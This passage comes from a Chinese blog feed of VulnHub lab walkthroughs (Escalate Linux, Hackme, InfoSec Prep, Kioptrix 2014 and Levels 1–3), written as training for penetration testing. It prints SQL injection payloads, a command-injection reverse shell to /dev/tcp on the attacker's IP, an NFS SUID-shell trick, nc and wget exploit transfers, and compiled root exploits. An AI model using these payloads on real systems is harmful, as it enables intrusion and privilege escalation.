<p><img src="/images/Escalate-Linux-1/8.png" alt="8"></p>
<h3 id="2-cronjob"><a href="#2-cronjob" class="headerlink" title="2 cronjob"></a>2 cronjob</h3><p>/etc/crontab发现了计划任务，5分钟执行一次</p>
<p><img src="/images/Escalate-Linux-1/9.png" alt="9"></p>
<p>但只有user4可以修改，如果我们切换到他，修改shell脚本的内容，我们就可以提权</p>
<p><img src="/images/Escalate-Linux-1/10.png" alt="10"></p>
<h3 id="3-NFS"><a href="#3-NFS" class="headerlink" title="3 NFS"></a>3 NFS</h3><p><img src="/images/Escalate-Linux-1/11.png" alt="11"></p>
<p>发现了no_root_suash<br>直接在kali挂载它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.232:&#x2F;home&#x2F;user5 &#x2F;tmp&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<p>在kali中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;bin&#x2F;sh evil</span><br><span class="line">chown root:root evil</span><br><span class="line">chmod u+s evil</span><br></pre></td></tr></table></figure>

<p>在目标中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;evil -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Escalate-Linux-1/12.png" alt="12"></p>
<h3 id="4-mysql"><a href="#4-mysql" class="headerlink" title="4 mysql"></a>4 mysql</h3><p><img src="/images/Escalate-Linux-1/13.png" alt="13"></p>
<p>linpeas非常只能，直接发现了mysql默认的连接凭据root/root可以登录</p>
<p>枚举/etc/passwd发现mysql用户具有/bin/bash<br>数据库内又存放mysql的密码，直接切换过去</p>
<p><img src="/images/Escalate-Linux-1/14.png" alt="14"></p>
<p>之后在/var/mysql里寻找信息</p>
<p><img src="/images/Escalate-Linux-1/15.png" alt="15"></p>
<p>发现了.user_informations</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 .user_informations</span><br></pre></td></tr></table></figure>

<p>里面存有普通用户的密码</p>
<p>之后再在/etc/mysql里寻找，发现了secret.cnf，存放有root的密码</p>
<p><img src="/images/Escalate-Linux-1/16.png" alt="16"></p>
<p>其他方法没啥意思，检查检查各自的SUID和sudo就行了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Hackme 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BAHackme-1/</url>
    <content><![CDATA[<h1 id="Hackme-1"><a href="#Hackme-1" class="headerlink" title="Hackme 1"></a>Hackme 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.211 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.211 -oN nmap</span><br></pre></td></tr></table></figure>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80端口</p>
<p><img src="/images/Hackme-1/2.png" alt="2"></p>
<p>尝试sql注入失败，发现有注册功能，注册一个账号evil/password123</p>
<p>之后跳转到一个书籍的搜索页面</p>
<p><img src="/images/Hackme-1/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这里我们可以尝试sql注入，尝试的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/4.png" alt="4"></p>
<p>成功发现了sql注入漏洞，看样子是存在回显的，我们可以针对它测试几种常见的注入方式</p>
<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>确认字段数，这里为了确认字段数是否正确，我们需要页面产生一定的回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 3#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 4#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/6.png" alt="6"></p>
<p>可以得到字段数为3，接着尝试union注入，比如尝试爆出对方的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,schema_name from information_schema.schemata#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/7.png" alt="7"></p>
<p>webpphacking看起来有点意思，爆它的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;webapphacking&quot;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/8.png" alt="8"></p>
<p>爆users表的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;webapphacking&#39; and table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/9.png" alt="9"></p>
<p>最后爆出数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select user,pasword,name from users#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/10.png" alt="10"></p>
<p>superadmin的账户名称看起来很显眼</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,1,0))#</span><br></pre></td></tr></table></figure>

<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 and length(database())&gt;7#</span><br></pre></td></tr></table></figure>



<p>破解md5</p>
<p><img src="/images/Hackme-1/11.png" alt="11"></p>
<p>所以凭据为<code>superadmin/Uncrackable</code></p>
<p><img src="/images/Hackme-1/12.png" alt="12"></p>
<p>登录进去后，我们应该有一个后台的文件上传<br>虽然这里要求上传一个Image，但是没有做任何过滤，我们直接上传php的shell</p>
<p><img src="/images/Hackme-1/13.png" alt="13"></p>
<p>提示路径在<code>/uploads/</code>下</p>
<p><img src="/images/Hackme-1/14.png" alt="14"></p>
<p>直接获取shell</p>
<p><img src="/images/Hackme-1/15.png" alt="15"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了普通用户hackme，但是mysql连接密码和存储的密码切不过去</p>
<p>看看www-data能不能提权</p>
<p><img src="/images/Hackme-1/16.png" alt="16"></p>
<p>SUID下发现了一个在home的文件<br>先执行看看是做什么的</p>
<p><img src="/images/Hackme-1/17.png" alt="17"></p>
<p>嗷，我懂了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场InfoSecPrep OSCP</title>
    <url>/2020/08/07/%E9%9D%B6%E5%9C%BAInfoSecPrep%20OSCP/</url>
    <content><![CDATA[<h1 id="InfoSec-Prep-OSCP"><a href="#InfoSec-Prep-OSCP" class="headerlink" title="InfoSec Prep: OSCP"></a>InfoSec Prep: OSCP</h1><p>一个非常简单的靶机，5分钟就做完了，貌似可兑换OSCP的30天代金卷</p>
<p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.200</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现了22和80端口</p>
<p><img src="/images/InfoSec-Prep-OSCP/1.jpg" alt="1"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>主站运行这wordpress，wpscan没发现可以利用的漏洞</p>
<p>发现路网站存在<code>robots.txt</code>提示了<code>secret.txt</code></p>
<p><img src="/images/InfoSec-Prep-OSCP/2.jpg" alt="2"></p>
<p>base64解密，得到<code>OPENSSH PRIVATE KEY</code></p>
<p>看来是可以用来进行ssh登录的，接下来把它转换成<code>RSA PRIVATE KEY</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install putty-tools</span><br><span class="line">puttygen pass -o tempkey.ppk</span><br><span class="line">puttygen tempkey.ppk -O private-openssh -o id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<p>再根据主机名猜一下用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa oscp@192.168.1.220</span><br></pre></td></tr></table></figure>

<p><img src="/images/InfoSec-Prep-OSCP/4.jpg" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>白给的</p>
<p>SUID配置问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm &#x2F;4000 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接执行bash就行</p>
<p><img src="/images/InfoSec-Prep-OSCP/5.jpg" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix 2014</title>
    <url>/2020/05/23/%E9%9D%B6%E5%9C%BAKioptrix-2014/</url>
    <content><![CDATA[<h1 id="Kioptrix-2014"><a href="#Kioptrix-2014" class="headerlink" title="Kioptrix 2014"></a>Kioptrix 2014</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.250</p>
<blockquote>
<p>Also, before powering on the VM I suggest you <strong>remove the network card and re-add it</strong>. For some oddball reason it doesn’t get its IP (well I do kinda know why but don’t want to give any details away). So just add the VM to your virtualization software, remove and then add a network card. Set it to bridge mode and you should be good to go.</p>
</blockquote>
<p>作者提示:如果扫描不到IP，删除并重新添加网卡，设置为桥接即可</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-2014/1.jpg" alt="1"></p>
<p> 开放了80、8080两个web端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Kioptrix-2014/2.jpg" alt="2"></p>
<p>8080打不开</p>
<p><img src="/images/Kioptrix-2014/3.jpg" alt="3"></p>
<p>80端口倒是可以打开，并找到了提示信息</p>
<p><img src="/images/Kioptrix-2014/4.jpg" alt="4"></p>
<p>根据提示信息，我们发现了<code>pchart 2.1.3</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>搜寻当前应用公开漏洞</p>
<p><img src="/images/Kioptrix-2014/5.jpg" alt="5"></p>
<p>发现了文件包含漏洞，利用它可以收集更多信息</p>
<p>尝试利用该漏洞</p>
<p><img src="/images/Kioptrix-2014/6.jpg" alt="6"></p>
<p>利用成功，而且还得知了操作系统为FreeBSD<br>由于之前访问8080失败，所以我希望能够读取apache的配置文件<code>httpd.conf</code>查看规则</p>
<p>搜索找到Apache在FreeBSD上的默认路径(/usr/local/etc/apache2x/httpd.conf),根据得到的apache版本，x=2<br>尝试使用文件包含进行读取</p>
<p><img src="/images/Kioptrix-2014/7.jpg" alt="7"></p>
<p>顺利读取到了配置文件，原来限制了UA</p>
<p>修改UA</p>
<p><img src="/images/Kioptrix-2014/10.jpg" alt="10"></p>
<p>访问8080端口</p>
<p><img src="/images/Kioptrix-2014/9.jpg" alt="9"></p>
<p>这次成功了，并且得到了正在运行的web应用<code>phptax</code><br>搜索公开漏洞，找到了msf里可以使用的RCE</p>
<p><img src="/images/Kioptrix-2014/11.jpg" alt="11"></p>
<p>使用msf进行攻击</p>
<p><img src="/images/Kioptrix-2014/12.jpg" alt="12"></p>
<p>成功</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>根据收集的系统信息，查找FreeBSD 9.0的提权exp</p>
<p><img src="/images/Kioptrix-2014/13.jpg" alt="13"></p>
<p>传输提权脚本，这次系统没有wget，我们使用nc进行传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击者</span><br><span class="line">nc -lvp 4444 &lt; exp.c</span><br><span class="line">受害者</span><br><span class="line">nc -nv 192.168.1.3 4444 &gt; exp.c</span><br></pre></td></tr></table></figure>

<p>之后编译执行</p>
<p><img src="/images/Kioptrix-2014/14.jpg" alt="14"></p>
<p>成功获取root权限</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix_Level_1</title>
    <url>/2020/03/25/%E9%9D%B6%E5%9C%BAKioptrix-Level-1/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix_Level_1"></a>Kioptrix_Level_1</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.104</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h2><p>nmap扫描端口</p>
<p><img src="/images/Kioptrix1/4.jpg" alt="4"></p>
<p>习惯性顺着来，22端口没发现可以顺利利用的漏洞</p>
<p>80端口利用dirbuster进行目录枚举，找到了一个可以利用的点:mod_ssl</p>
<p><img src="/images/Kioptrix1/5.jpg" alt="5"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h2><h3 id="mod-ssl"><a href="#mod-ssl" class="headerlink" title="mod_ssl"></a>mod_ssl</h3><p><img src="/images/Kioptrix1/6.jpg" alt="6"></p>
<p>有几个OpenFuck缓冲区溢出的漏洞可以使用，我这里使用了<code>47080.c</code></p>
<p>编译的时候报错了，发现少装个库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libssl-dev</span><br></pre></td></tr></table></figure>

<p>编译使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -o exp 47080.c -lcrypto</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>

<p>这里需要指定目标的操作系统和apache版本，根据之前Nmap扫描的结果定位到Redhat Linux及apache 1.3.20</p>
<img src="/images/Kioptrix1/7.jpg"/> 

<p>执行exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;exploit 0x6b 192.168.1.104 -c 50</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix1/8.jpg" alt="8"></p>
<p>直接就是root，有兴趣可以读一下flag在<code>/var/mail/root</code></p>
<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><p>这里用了msf，进行了一次smb version的扫描</p>
<p><img src="/images/Kioptrix1/9.jpg" alt="9"></p>
<p>得到版本2.2.1a</p>
<p>寻找可用的Exploit</p>
<p><img src="/images/Kioptrix1/10.png" alt="10"></p>
<p>这个RCE漏洞看来是个不错的选择</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;multiple&#x2F;remote&#x2F;10.c exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# gcc -o samba exp.c</span><br><span class="line">root@kali:~&#x2F;Desktop# chmod 777 samba</span><br><span class="line">root@kali:~&#x2F;Desktop# .&#x2F;samba </span><br><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">Usage: .&#x2F;samba [-bBcCdfprsStv] [host]</span><br><span class="line"></span><br><span class="line">-b &lt;platform&gt;   bruteforce (0 &#x3D; Linux, 1 &#x3D; FreeBSD&#x2F;NetBSD, 2 &#x3D; OpenBSD 3.1 and prior, 3 &#x3D; OpenBSD 3.2)</span><br><span class="line">-B &lt;step&gt;       bruteforce steps (default &#x3D; 300)</span><br><span class="line">-c &lt;ip address&gt; connectback ip address</span><br><span class="line">-C &lt;max childs&gt; max childs for scan&#x2F;bruteforce mode (default &#x3D; 40)</span><br><span class="line">-d &lt;delay&gt;      bruteforce&#x2F;scanmode delay in micro seconds (default &#x3D; 100000)</span><br><span class="line">-f              force</span><br><span class="line">-p &lt;port&gt;       port to attack (default &#x3D; 139)</span><br><span class="line">-r &lt;ret&gt;        return address</span><br><span class="line">-s              scan mode (random)</span><br><span class="line">-S &lt;network&gt;    scan mode</span><br><span class="line">-t &lt;type&gt;       presets (0 for a list)</span><br><span class="line">-v              verbose mode</span><br></pre></td></tr></table></figure>

<p>这次编译没报错，直接运行拿到root</p>
<p><img src="/images/Kioptrix1/11.jpg" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-2</title>
    <url>/2020/05/03/%E9%9D%B6%E5%9C%BAKioptrix-Level-2/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-2"><a href="#Kioptrix-Level-2" class="headerlink" title="Kioptrix_Level_2"></a>Kioptrix_Level_2</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/images/Kioptrix2/12.jpg" alt="12"></p>
<p>22端口没有发现好用的exp<br>80端口开放了web，3306开启了mysql，这是我们感兴趣的</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接看看web运行的是什么</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.233</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/13.jpg" alt="13"></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>发现一个登录页面，经测试发现存在sql注入<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>登录成功，页面发生跳转</p>
<p><img src="/images/Kioptrix2/14.jpg" alt="14"></p>
<p>发现网站提供了<code>ping</code>用户输入的功能，输入<code>127.0.0.1</code><br>网站会打开一个新的页面，回显形式如下</p>
<p><img src="/images/Kioptrix2/15.jpg" alt="15"></p>
<p>预感这里使用ping命令会存在命令注入，经过测试发现</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/16.jpg" alt="16"></p>
<p>发现执行命令的用户权限为<code>apache</code></p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>存在命令注入，我就可以利用它，进行反向连接来获取<code>apache</code>这个用户的bashshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 | bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.3&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix2/17.jpg" alt="17"></p>
<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>先获取操作系统的相关信息(uname)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ uname -mrs</span><br><span class="line">Linux 2.6.9-55.EL i686</span><br></pre></td></tr></table></figure>

<p>搜索可以利用exp，<code>9545.c</code>看上去一个不错的本地提权</p>
<p><img src="/images/Kioptrix2/18.jpg" alt="18"></p>
<h4 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h4><p>这里我想在目标机上使用<code>wget</code>传输编译好的exp，所以我开启web服务，并复制exp到web目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# cp 9545.c &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>

<p>直接<code>wget</code>会报错，因为用户<code>apache</code>并不拥有<code>W</code>权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:07:25--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;exp&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line">exp: Permission denied</span><br><span class="line"></span><br><span class="line">Cannot write to &#96;exp&#39; (Permission denied).</span><br><span class="line">bash-3.00$ ls -ld &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drwxr-xr-x  2 root root 4096 Oct  8  2009 &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>

<p>所以我们转移到<code>/tmp</code>目录来执行我们的操作，成功传输了exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ cd &#x2F;tmp</span><br><span class="line">bash-3.00$ ls -ld &#x2F;tmp</span><br><span class="line">drwxr-xrwx  4 root root 4096 May  2 21:26 &#x2F;tmp</span><br><span class="line">bash-3.00$ wget 192.168.1.3&#x2F;9545.c</span><br><span class="line">--22:16:57--  http:&#x2F;&#x2F;192.168.1.3&#x2F;9545.c</span><br><span class="line">           &#x3D;&gt; &#96;9545.c&#39;</span><br><span class="line">Connecting to 192.168.1.3:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9,783 (9.6K) [text&#x2F;x-csrc]</span><br><span class="line"></span><br><span class="line">    0K .........                                             100%   76.47 MB&#x2F;s</span><br><span class="line"></span><br><span class="line">22:16:57 (76.47 MB&#x2F;s) - &#96;9545.c&#39; saved [9783&#x2F;9783]</span><br></pre></td></tr></table></figure>

<p>编译执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-3.00$ gcc 9545.c -o exploit</span><br><span class="line">9545.c:376:28: warning: no newline at end of file</span><br><span class="line">bash-3.00$ ls</span><br><span class="line">9545.c</span><br><span class="line">exploit</span><br><span class="line">bash-3.00$ .&#x2F;exploit</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>至此成功提权为root权限</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix-Level-3</title>
    <url>/2020/05/05/%E9%9D%B6%E5%9C%BAKioptrix-Level-3/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-3"><a href="#Kioptrix-Level-3" class="headerlink" title="Kioptrix_Level_3"></a>Kioptrix_Level_3</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.251</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-Level-3/1.jpg" alt="1"></p>
<p>只发现了ssh和http服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>目录扫描，发现了phpmyadmin</p>
<p><img src="/images/Kioptrix-Level-3/2.jpg" alt="1"></p>
<p>cms扫描，得到LotusCMS</p>
<p><img src="/images/Kioptrix-Level-3/6.jpg" alt="6"></p>
<p>之后我打开了它的http服务，手动寻找一些有用的信息</p>
<p><img src="/images/Kioptrix-Level-3/3.jpg" alt="3"></p>
<p>首先应该给网站做一个host，让页面正常显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;hosts</span><br><span class="line">192.168.1.251	kioptrix3.com	</span><br><span class="line">service networking restart</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/4.jpg" alt="4"></p>
<p><img src="/images/Kioptrix-Level-3/5.jpg" alt="5"></p>
<p>网站包含了一个登录页面，但没找出sql注入</p>
<p><img src="/images/Kioptrix-Level-3/7.jpg" alt="7"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="CMS漏洞Getshell"><a href="#CMS漏洞Getshell" class="headerlink" title="CMS漏洞Getshell"></a>CMS漏洞Getshell</h3><p>之前利用<code>whatweb</code>侦测出网站使用的是<code>LotusCMS</code>，不过我们尚且不知道具体的版本<br><code>searsploit</code>发现了Metasploit里存在的exp，可以当作最后的手段</p>
<p><img src="/images/Kioptrix-Level-3/8.jpg" alt="8"></p>
<p>接着又去google和github上找了找，成功找到了一个shell脚本</p>
<p><a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh">https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;lotusRCE.sh 192.168.1.251		</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/9.jpg" alt="9"></p>
<p>根据提示输入反向连接的IP和port，成功利用nc拿到一个低权限的shell，这是一个不错的入口</p>
<p>通过这个shell我们可以查看www目录下的文件，挖掘更多的信息</p>
<p><code>/home/www/kioptrix3.com/gallery/gconfig.php</code>找到了mysql的root连接的账号密码</p>
<p><img src="/images/Kioptrix-Level-3/10.jpg" alt="10"></p>
<p>有了这个就可以登录之前枚举出的<code>phpmyadmin</code>了<br>用户名:<code>root</code><br>密码:<code>fuckeyou</code></p>
<p>成功登录phpmyadmin，尝试进行UDF提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR root@ &#39;localhost&#39;;	&#x2F;&#x2F;查看权限</span><br><span class="line">SHOW VARIABLES LIKE &quot;%secure%&quot;;		&#x2F;&#x2F;查看是否可以写入文件，这里为空</span><br></pre></td></tr></table></figure>

<p>但这里无法写入文件，具体原因未知。。。</p>
<p><img src="/images/Kioptrix-Level-3/13.jpg" alt="13">尝试信息收集，获取到两个用户和加密后的hash</p>
<p><img src="/images/Kioptrix-Level-3/11.jpg" alt="11"></p>
<p>破解两个hash可以得到两组账号名和密码</p>
<table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>dreg</td>
<td>Mast3r</td>
</tr>
<tr>
<td>loneferret</td>
<td>starwars</td>
</tr>
</tbody></table>
<p>另外在<code>gallarific_users</code>表中也存在一个账号密码</p>
<table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>n0t7t1k4</td>
</tr>
</tbody></table>
<h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>漏洞地址为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p>存在回显注入、盲注、报错注入</p>
<p><img src="/images/Kioptrix-Level-3/14.jpg" alt="14"></p>
<p>我们同样可以利用这个漏洞来读出上面爆出的两个账号密码</p>
<p>可以使用sqlmap</p>
<p><img src="/images/Kioptrix-Level-3/15.jpg" alt="15"></p>
<h4 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h4><p>确认字段数(6)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20order%20by%206--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p>查看页面回显输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;kioptrix3.com&#x2F;gallery&#x2F;gallery.php?id&#x3D;1%20union%20select%201,2,3,4,5,6--+&amp;sort&#x3D;photoid#photos</span><br></pre></td></tr></table></figure>

<p><img src="/images/Kioptrix-Level-3/16.jpg" alt="16"></p>
<p>确认数据库名</p>
